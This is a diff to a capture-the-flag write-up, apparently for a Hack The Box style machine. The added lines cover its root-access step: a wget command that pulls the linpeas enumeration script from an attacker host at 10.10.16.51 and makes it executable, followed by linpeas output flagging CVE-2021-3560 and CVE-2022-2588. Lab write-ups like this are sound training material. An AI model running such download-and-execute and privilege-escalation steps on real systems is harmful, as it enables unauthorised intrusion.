@@ -87,3 +87,13 @@ And here we find the user.txt flag, I'll let you grab that yourself if you're re
 ## Root Access
 Ok, so we have the user account, the first thing i run to make things easier to find is linpeas!
 
+`wget 10.10.16.51:8000/linpeas.sh && chmod +x linpeas.sh`
+I've included the output of linpeas as it's own file within this folder if you want to read over what it found.
+I see potentially some CVE vulnerabilities
+
+```
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-3560
+
+Potentially Vulnerable to CVE-2022-2588
+```
